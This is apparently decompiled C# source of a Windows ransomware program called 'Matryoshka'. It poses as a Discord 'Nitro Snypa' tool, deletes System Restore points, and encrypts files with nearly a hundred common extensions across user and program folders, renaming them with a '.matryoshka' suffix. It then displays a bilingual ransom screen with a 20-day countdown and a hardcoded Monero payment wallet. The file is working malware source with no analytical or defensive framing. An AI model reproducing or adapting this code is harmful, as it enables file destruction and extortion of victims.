using System;
using System.ComponentModel;
using System.Drawing;
using System.Globalization;
using System.IO;
using System.Linq;
using System.Management;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;
using Crypt0r;
using Matryoshka.Properties;
using Microsoft.Win32;

namespace Matryoshka;

public class Matryoshka : Form
{
	public static DateTime Time;

	public string DeviceID = "";

	private IContainer components;

	private PictureBox pb_Matryoshka;

	private Panel pnl_Matryoshka;

	private Label lbl_Matryoshka;

	private Label lbl_Timer;

	private Label lbl_TimeLeft;

	private ComboBox cb_Lang;

	private Panel pnl_Payment;

	private Label lbl_GUID;

	private Label lbl_GuidLbl;

	private PictureBox pb_Monero;

	private Button btn_Confirm;

	private Label lbl_Wallet;

	private TextBox txt_Wallet;

	private Label lbl_ReadRU;

	private Label lbl_Read;

	private WebBrowser wb_HowTo;

	private Button btn_CopyWallet;

	private Label lbl_SendTo;

	private Timer TTimer;

	private TextBox txt_WalletPay;

	public Matryoshka()
	{
		InitializeComponent();
		((Control)this).Hide();
	}

	[DllImport("Srclient.dll")]
	public static extern int SRRemoveRestorePoint(int index);

	public bool SetDeviceID()
	{
		if (!Registry.LocalMachine.OpenSubKey("SOFTWARE")!.GetSubKeyNames().Contains("Matryoshka"))
		{
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE", writable: true)!.CreateSubKey("Matryoshka", RegistryKeyPermissionCheck.ReadWriteSubTree);
			DeviceID = Guid.NewGuid().ToString();
			registryKey.SetValue("guid", DeviceID);
			registryKey.Close();
			((Control)lbl_GUID).set_Text(DeviceID);
			Time = DateTime.Now;
			Registry.LocalMachine.OpenSubKey("SOFTWARE\\Matryoshka", writable: true)!.SetValue("clock", Time.ToString("yyyy-MM-dd HH:mm:ss"));
			return false;
		}
		DeviceID = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Matryoshka")!.GetValue("guid")!.ToString();
		((Control)lbl_GUID).set_Text(DeviceID);
		Time = DateTime.ParseExact(Convert.ToString(Registry.LocalMachine.OpenSubKey("SOFTWARE\\Matryoshka")!.GetValue("clock")), "yyyy-MM-dd HH:mm:ss", CultureInfo.InvariantCulture);
		return true;
	}

	private void Matryoshka_Load(object sender, EventArgs e)
	{
		if (File.Exists("C:\\MatryoshkaKillswitch.txt"))
		{
			((Form)this).Close();
			return;
		}
		if (!SetDeviceID())
		{
			new Thread((ThreadStart)delegate
			{
				//IL_000a: Unknown result type (might be due to invalid IL or missing references)
				MessageBox.Show("Welcome to Nitro Snypa.\nThe application has been attached to Discord and is now running in the background looking for Nitro codes.\nYou will be informed if any valid code is found as it is instantly claimed.", "Nitro Snypa v5.32 beta");
			}).Start();
			try
			{
				DelRestPoints();
			}
			catch (Exception)
			{
			}
			EncFiles();
		}
		TTimer.Start();
		((Control)this).Show();
		wb_HowTo.set_DocumentText(Resources.MsgEn);
	}

	private void EncryptFile(string location, Cryptor c)
	{
		try
		{
			byte[] bytesToEncode = File.ReadAllBytes(location);
			byte[] bytes = c.Encode(bytesToEncode);
			File.WriteAllBytes(location, bytes);
			File.Move(location, location + ".matryoshka");
		}
		catch (Exception)
		{
		}
	}

	private void EncryptDirectory(string location, Cryptor c)
	{
		string[] source = new string[96]
		{
			".txt", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".odt", ".jpg", ".png",
			".csv", ".sql", ".mdb", ".sln", ".php", ".asp", ".aspx", ".html", ".xml", ".psd",
			".php", ".py", ".c", ".cpp", ".cc", ".c++", ".cxx", ".cs", ".rb", ".js",
			".jsx", ".cfg", ".conf", ".config", ".json", ".jsonl", ".h", ".hpp", ".hh", ".odt",
			".rtf", ".pdf", ".mp3", ".mp4", ".wav", ".ogg", ".zip", ".rar", ".7z", ".gz",
			".wmv", ".wma", ".mkv", ".m4a", ".sh", ".mid", ".midi", ".z", ".vcd", ".dat",
			".csv", ".log", ".sav", ".bak", ".db", ".htm", ".cgi", ".pl", ".java", ".class",
			".ai", ".svg", ".tiff", ".tif", ".bmp", ".gif", ".jsp", ".pps", ".mov", ".mpg",
			".mpeg", ".jpeg", ".avi", ".flv", ".tex", ".qml", ".h5", ".h2", ".pickle", ".vegas",
			".svp", ".vp", ".v", ".skript", ".lua", ".audacity"
		};
		string[] files = Directory.GetFiles(location);
		string[] directories = Directory.GetDirectories(location);
		for (int i = 0; i < files.Length; i++)
		{
			string extension = Path.GetExtension(files[i]);
			if (source.Contains(extension))
			{
				EncryptFile(files[i], c);
			}
		}
		for (int j = 0; j < directories.Length; j++)
		{
			try
			{
				EncryptDirectory(directories[j], c);
			}
			catch (Exception)
			{
			}
		}
	}

	private void EncFiles()
	{
		Cryptor c = new Cryptor();
		string pathRoot = Path.GetPathRoot(Assembly.GetEntryAssembly()!.Location);
		try
		{
			EncryptDirectory(Path.Combine(pathRoot, "Users"), c);
		}
		catch (Exception)
		{
		}
		try
		{
			EncryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), c);
		}
		catch (Exception)
		{
		}
		try
		{
			EncryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles), c);
		}
		catch (Exception)
		{
		}
		try
		{
			EncryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86), c);
		}
		catch (Exception)
		{
		}
	}

	private void DelRestPoints()
	{
		//IL_000a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0014: Expected O, but got Unknown
		//IL_000f: Unknown result type (might be due to invalid IL or missing references)
		ManagementObjectEnumerator enumerator = new ManagementClass("\\\\.\\root\\default", "systemrestore", new ObjectGetOptions()).GetInstances().GetEnumerator();
		try
		{
			while (enumerator.MoveNext())
			{
				SRRemoveRestorePoint((int)(uint)enumerator.get_Current().get_Item("sequencenumber"));
			}
		}
		finally
		{
			((IDisposable)enumerator)?.Dispose();
		}
	}

	private void txt_Wallet_TextChanged(object sender, EventArgs e)
	{
		string text = ((Control)txt_Wallet).get_Text();
		if (text.Length == 95 && (text[0] == '8' || text[0] == '4') && (text[1] == 'A' || text[1] == 'B' || text[1] == '0' || text[1] == '1' || text[1] == '2' || text[1] == '3' || text[1] == '4' || text[1] == '5' || text[1] == '6' || text[1] == '7' || text[1] == '8' || text[1] == '9'))
		{
			((Control)btn_Confirm).set_Enabled(true);
		}
		else
		{
			((Control)btn_Confirm).set_Enabled(false);
		}
	}

	private void btn_CopyWallet_Click(object sender, EventArgs e)
	{
		//IL_0015: Unknown result type (might be due to invalid IL or missing references)
		Clipboard.SetText(((Control)txt_WalletPay).get_Text());
		MessageBox.Show("Копируется в буфер обмена.\n\nCopied to clipboard.");
	}

	private void cb_Lang_SelectedIndexChanged(object sender, EventArgs e)
	{
		if (((ListControl)cb_Lang).get_SelectedIndex() == 0)
		{
			wb_HowTo.set_DocumentText(Resources.MsgEn);
		}
		else
		{
			wb_HowTo.set_DocumentText(Resources.MsgRu);
		}
	}

	private void TTimer_Tick(object sender, EventArgs e)
	{
		TimeSpan timeSpan = Time.Add(new TimeSpan(20, 0, 0, 0)).Subtract(DateTime.Now);
		int days = timeSpan.Days;
		int hours = timeSpan.Hours;
		int minutes = timeSpan.Minutes;
		int seconds = timeSpan.Seconds;
		string text = days + "d " + hours + "h " + minutes + "m " + seconds + "s";
		((Control)lbl_Timer).set_Text(text);
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		//IL_003d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0047: Expected O, but got Unknown
		//IL_0048: Unknown result type (might be due to invalid IL or missing references)
		//IL_0052: Expected O, but got Unknown
		//IL_0053: Unknown result type (might be due to invalid IL or missing references)
		//IL_005d: Expected O, but got Unknown
		//IL_005e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0068: Expected O, but got Unknown
		//IL_0069: Unknown result type (might be due to invalid IL or missing references)
		//IL_0073: Expected O, but got Unknown
		//IL_0074: Unknown result type (might be due to invalid IL or missing references)
		//IL_007e: Expected O, but got Unknown
		//IL_007f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0089: Expected O, but got Unknown
		//IL_008a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0094: Expected O, but got Unknown
		//IL_0095: Unknown result type (might be due to invalid IL or missing references)
		//IL_009f: Expected O, but got Unknown
		//IL_00a0: Unknown result type (might be due to invalid IL or missing references)
		//IL_00aa: Expected O, but got Unknown
		//IL_00ab: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b5: Expected O, but got Unknown
		//IL_00b6: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c0: Expected O, but got Unknown
		//IL_00c1: Unknown result type (might be due to invalid IL or missing references)
		//IL_00cb: Expected O, but got Unknown
		//IL_00cc: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d6: Expected O, but got Unknown
		//IL_00d7: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e1: Expected O, but got Unknown
		//IL_00e2: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ec: Expected O, but got Unknown
		//IL_00f3: Unknown result type (might be due to invalid IL or missing references)
		//IL_00fd: Expected O, but got Unknown
		//IL_02a5: Unknown result type (might be due to invalid IL or missing references)
		//IL_02af: Expected O, but got Unknown
		//IL_032f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0339: Expected O, but got Unknown
		//IL_03ad: Unknown result type (might be due to invalid IL or missing references)
		//IL_03b7: Expected O, but got Unknown
		//IL_04b0: Unknown result type (might be due to invalid IL or missing references)
		//IL_04ba: Expected O, but got Unknown
		//IL_0782: Unknown result type (might be due to invalid IL or missing references)
		//IL_078c: Expected O, but got Unknown
		//IL_08a3: Unknown result type (might be due to invalid IL or missing references)
		//IL_08ad: Expected O, but got Unknown
		//IL_097f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0989: Expected O, but got Unknown
		//IL_0b01: Unknown result type (might be due to invalid IL or missing references)
		//IL_0c6f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0c79: Expected O, but got Unknown
		components = new Container();
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Matryoshka));
		pb_Matryoshka = new PictureBox();
		pnl_Matryoshka = new Panel();
		lbl_GUID = new Label();
		lbl_GuidLbl = new Label();
		lbl_Timer = new Label();
		lbl_TimeLeft = new Label();
		lbl_Matryoshka = new Label();
		cb_Lang = new ComboBox();
		pnl_Payment = new Panel();
		txt_WalletPay = new TextBox();
		btn_CopyWallet = new Button();
		lbl_SendTo = new Label();
		btn_Confirm = new Button();
		lbl_Wallet = new Label();
		txt_Wallet = new TextBox();
		lbl_ReadRU = new Label();
		lbl_Read = new Label();
		pb_Monero = new PictureBox();
		wb_HowTo = new WebBrowser();
		TTimer = new Timer(components);
		((ISupportInitialize)pb_Matryoshka).BeginInit();
		((Control)pnl_Matryoshka).SuspendLayout();
		((Control)pnl_Payment).SuspendLayout();
		((ISupportInitialize)pb_Monero).BeginInit();
		((Control)this).SuspendLayout();
		pb_Matryoshka.set_Image((Image)(object)Resources.Matryoshka);
		pb_Matryoshka.set_InitialImage((Image)(object)Resources.Matryoshka);
		((Control)pb_Matryoshka).set_Location(new Point(-1, -1));
		((Control)pb_Matryoshka).set_Name("pb_Matryoshka");
		((Control)pb_Matryoshka).set_Size(new Size(201, 193));
		pb_Matryoshka.set_SizeMode((PictureBoxSizeMode)4);
		pb_Matryoshka.set_TabIndex(0);
		pb_Matryoshka.set_TabStop(false);
		pnl_Matryoshka.set_BorderStyle((BorderStyle)1);
		((Control)pnl_Matryoshka).get_Controls().Add((Control)(object)lbl_GUID);
		((Control)pnl_Matryoshka).get_Controls().Add((Control)(object)lbl_GuidLbl);
		((Control)pnl_Matryoshka).get_Controls().Add((Control)(object)lbl_Timer);
		((Control)pnl_Matryoshka).get_Controls().Add((Control)(object)lbl_TimeLeft);
		((Control)pnl_Matryoshka).get_Controls().Add((Control)(object)lbl_Matryoshka);
		((Control)pnl_Matryoshka).get_Controls().Add((Control)(object)pb_Matryoshka);
		((Control)pnl_Matryoshka).set_Location(new Point(10, 10));
		((Control)pnl_Matryoshka).set_Name("pnl_Matryoshka");
		((Control)pnl_Matryoshka).set_Size(new Size(202, 449));
		((Control)pnl_Matryoshka).set_TabIndex(1);
		((Control)lbl_GUID).set_AutoSize(true);
		((Control)lbl_GUID).set_Font(new Font("Microsoft Sans Serif", 8f));
		((Control)lbl_GUID).set_Location(new Point(0, 304));
		((Control)lbl_GUID).set_Name("lbl_GUID");
		((Control)lbl_GUID).set_Size(new Size(25, 13));
		((Control)lbl_GUID).set_TabIndex(5);
		((Control)lbl_GUID).set_Text("???");
		lbl_GUID.set_TextAlign((ContentAlignment)16);
		((Control)lbl_GuidLbl).set_AutoSize(true);
		((Control)lbl_GuidLbl).set_Font(new Font("Segoe UI", 9f, (FontStyle)1));
		((Control)lbl_GuidLbl).set_Location(new Point(63, 279));
		((Control)lbl_GuidLbl).set_Name("lbl_GuidLbl");
		((Control)lbl_GuidLbl).set_Size(new Size(83, 15));
		((Control)lbl_GuidLbl).set_TabIndex(4);
		((Control)lbl_GuidLbl).set_Text("ГУИД (GUID):");
		((Control)lbl_Timer).set_AutoSize(true);
		((Control)lbl_Timer).set_Font(new Font("Segoe UI", 16f, (FontStyle)1));
		((Control)lbl_Timer).set_ForeColor(Color.Red);
		((Control)lbl_Timer).set_Location(new Point(3, 239));
		((Control)lbl_Timer).set_Name("lbl_Timer");
		((Control)lbl_Timer).set_Size(new Size(192, 30));
		((Control)lbl_Timer).set_TabIndex(3);
		((Control)lbl_Timer).set_Text("20d 23h 59m 59s");
		lbl_Timer.set_TextAlign((ContentAlignment)32);
		((Control)lbl_TimeLeft).set_AutoSize(true);
		((Control)lbl_TimeLeft).set_Location(new Point(25, 217));
		((Control)lbl_TimeLeft).set_Name("lbl_TimeLeft");
		((Control)lbl_TimeLeft).set_Size(new Size(153, 13));
		((Control)lbl_TimeLeft).set_TabIndex(2);
		((Control)lbl_TimeLeft).set_Text("Оставшееся время (time left):");
		((Control)lbl_Matryoshka).set_AutoSize(true);
		((Control)lbl_Matryoshka).set_Font(new Font("Segoe UI", 12f, (FontStyle)1));
		((Control)lbl_Matryoshka).set_Location(new Point(5, 195));
		((Control)lbl_Matryoshka).set_Name("lbl_Matryoshka");
		((Control)lbl_Matryoshka).set_Size(new Size(192, 21));
		((Control)lbl_Matryoshka).set_TabIndex(1);
		((Control)lbl_Matryoshka).set_Text("Матрёшка Рансомваре");
		((ListControl)cb_Lang).set_DisplayMember("0");
		((ListControl)cb_Lang).set_FormattingEnabled(true);
		cb_Lang.get_Items().AddRange(new object[2] { "English", "Русский" });
		((Control)cb_Lang).set_Location(new Point(532, 15));
		((Control)cb_Lang).set_Name("cb_Lang");
		((Control)cb_Lang).set_Size(new Size(106, 21));
		((Control)cb_Lang).set_TabIndex(4);
		((Control)cb_Lang).set_Text("English");
		cb_Lang.add_SelectedIndexChanged((EventHandler)cb_Lang_SelectedIndexChanged);
		pnl_Payment.set_BorderStyle((BorderStyle)1);
		((Control)pnl_Payment).get_Controls().Add((Control)(object)txt_WalletPay);
		((Control)pnl_Payment).get_Controls().Add((Control)(object)btn_CopyWallet);
		((Control)pnl_Payment).get_Controls().Add((Control)(object)lbl_SendTo);
		((Control)pnl_Payment).get_Controls().Add((Control)(object)btn_Confirm);
		((Control)pnl_Payment).get_Controls().Add((Control)(object)lbl_Wallet);
		((Control)pnl_Payment).get_Controls().Add((Control)(object)txt_Wallet);
		((Control)pnl_Payment).get_Controls().Add((Control)(object)lbl_ReadRU);
		((Control)pnl_Payment).get_Controls().Add((Control)(object)lbl_Read);
		((Control)pnl_Payment).get_Controls().Add((Control)(object)pb_Monero);
		((Control)pnl_Payment).set_Location(new Point(217, 246));
		((Control)pnl_Payment).set_Name("pnl_Payment");
		((Control)pnl_Payment).set_Size(new Size(445, 213));
		((Control)pnl_Payment).set_TabIndex(5);
		((Control)txt_WalletPay).set_Location(new Point(3, 156));
		((Control)txt_WalletPay).set_Name("txt_WalletPay");
		((TextBoxBase)txt_WalletPay).set_ReadOnly(true);
		((Control)txt_WalletPay).set_Size(new Size(437, 20));
		((Control)txt_WalletPay).set_TabIndex(8);
		((Control)txt_WalletPay).set_Text("47NVMZew49WYxzHGQUJZARRXu38ydxCyj4iXPn69jL5xXvitL8wyq7yVpYcfNxs6M5ckDdpJdpMbP7buEqtNs1FE15wmby4");
		((Control)btn_CopyWallet).set_BackColor(Color.Tomato);
		((Control)btn_CopyWallet).set_Enabled(false);
		((ButtonBase)btn_CopyWallet).set_FlatStyle((FlatStyle)0);
		((Control)btn_CopyWallet).set_Font(new Font("Segoe UI", 9f));
		((Control)btn_CopyWallet).set_Location(new Point(126, 182));
		((Control)btn_CopyWallet).set_Name("btn_CopyWallet");
		((Control)btn_CopyWallet).set_Size(new Size(185, 26));
		((Control)btn_CopyWallet).set_TabIndex(7);
		((Control)btn_CopyWallet).set_Text("Копирования (Copy)");
		((ButtonBase)btn_CopyWallet).set_UseVisualStyleBackColor(false);
		((Control)btn_CopyWallet).add_Click((EventHandler)btn_CopyWallet_Click);
		((Control)lbl_SendTo).set_AutoSize(true);
		((Control)lbl_SendTo).set_Location(new Point(3, 122));
		((Control)lbl_SendTo).set_Name("lbl_SendTo");
		((Control)lbl_SendTo).set_Size(new Size(221, 26));
		((Control)lbl_SendTo).set_TabIndex(5);
		((Control)lbl_SendTo).set_Text("Отправьте оплату на следующий кошелек\r\nSend payment to wallet:");
		((Control)btn_Confirm).set_BackColor(Color.Tomato);
		((Control)btn_Confirm).set_Enabled(false);
		((ButtonBase)btn_Confirm).set_FlatStyle((FlatStyle)0);
		((Control)btn_Confirm).set_Font(new Font("Segoe UI", 12f));
		((Control)btn_Confirm).set_Location(new Point(98, 75));
		((Control)btn_Confirm).set_Name("btn_Confirm");
		((Control)btn_Confirm).set_Size(new Size(342, 33));
		((Control)btn_Confirm).set_TabIndex(4);
		((Control)btn_Confirm).set_Text("Подтвердить оплату (Confirm Payment)");
		((ButtonBase)btn_Confirm).set_UseVisualStyleBackColor(false);
		((Control)lbl_Wallet).set_AutoSize(true);
		((Control)lbl_Wallet).set_Location(new Point(3, 51));
		((Control)lbl_Wallet).set_Name("lbl_Wallet");
		((Control)lbl_Wallet).set_Size(new Size(94, 13));
		((Control)lbl_Wallet).set_TabIndex(3);
		((Control)lbl_Wallet).set_Text("Кошелек (Wallet):");
		((Control)txt_Wallet).set_Font(new Font("Segoe UI", 10f));
		((Control)txt_Wallet).set_Location(new Point(98, 48));
		((Control)txt_Wallet).set_Name("txt_Wallet");
		((Control)txt_Wallet).set_Size(new Size(343, 25));
		((Control)txt_Wallet).set_TabIndex(2);
		txt_Wallet.set_TextAlign((HorizontalAlignment)2);
		((Control)txt_Wallet).add_TextChanged((EventHandler)txt_Wallet_TextChanged);
		((Control)lbl_ReadRU).set_AutoSize(true);
		((Control)lbl_ReadRU).set_Location(new Point(123, 8));
		((Control)lbl_ReadRU).set_Name("lbl_ReadRU");
		((Control)lbl_ReadRU).set_Size(new Size(219, 13));
		((Control)lbl_ReadRU).set_TabIndex(1);
		((Control)lbl_ReadRU).set_Text("Прочитайте инструкции выше для оплаты");
		((Control)lbl_Read).set_AutoSize(true);
		((Control)lbl_Read).set_Location(new Point(123, 22));
		((Control)lbl_Read).set_Name("lbl_Read");
		((Control)lbl_Read).set_Size(new Size(161, 13));
		((Control)lbl_Read).set_TabIndex(1);
		((Control)lbl_Read).set_Text("Read Instructions Above To Pay");
		((Control)pb_Monero).set_BackColor(Color.White);
		pb_Monero.set_Image((Image)(object)Resources.Monero);
		((Control)pb_Monero).set_Location(new Point(3, 3));
		((Control)pb_Monero).set_Name("pb_Monero");
		((Control)pb_Monero).set_Padding(new Padding(4));
		((Control)pb_Monero).set_Size(new Size(114, 36));
		pb_Monero.set_SizeMode((PictureBoxSizeMode)1);
		pb_Monero.set_TabIndex(0);
		pb_Monero.set_TabStop(false);
		((Control)wb_HowTo).set_Location(new Point(217, 10));
		((Control)wb_HowTo).set_MinimumSize(new Size(20, 20));
		((Control)wb_HowTo).set_Name("wb_HowTo");
		((Control)wb_HowTo).set_Size(new Size(442, 230));
		((Control)wb_HowTo).set_TabIndex(6);
		TTimer.set_Interval(1000);
		TTimer.add_Tick((EventHandler)TTimer_Tick);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Control)this).set_BackColor(Color.FromArgb(48, 48, 48));
		((Form)this).set_ClientSize(new Size(672, 469));
		((Control)this).get_Controls().Add((Control)(object)cb_Lang);
		((Control)this).get_Controls().Add((Control)(object)wb_HowTo);
		((Control)this).get_Controls().Add((Control)(object)pnl_Payment);
		((Control)this).get_Controls().Add((Control)(object)pnl_Matryoshka);
		((Control)this).set_ForeColor(Color.White);
		((Form)this).set_FormBorderStyle((FormBorderStyle)1);
		((Form)this).set_Icon((Icon)componentResourceManager.GetObject("$this.Icon"));
		((Form)this).set_MaximizeBox(false);
		((Control)this).set_Name("Matryoshka");
		((Form)this).set_ShowIcon(false);
		((Control)this).set_Text("Matryoshka");
		((Form)this).add_Load((EventHandler)Matryoshka_Load);
		((ISupportInitialize)pb_Matryoshka).EndInit();
		((Control)pnl_Matryoshka).ResumeLayout(false);
		((Control)pnl_Matryoshka).PerformLayout();
		((Control)pnl_Payment).ResumeLayout(false);
		((Control)pnl_Payment).PerformLayout();
		((ISupportInitialize)pb_Monero).EndInit();
		((Control)this).ResumeLayout(false);
	}
}
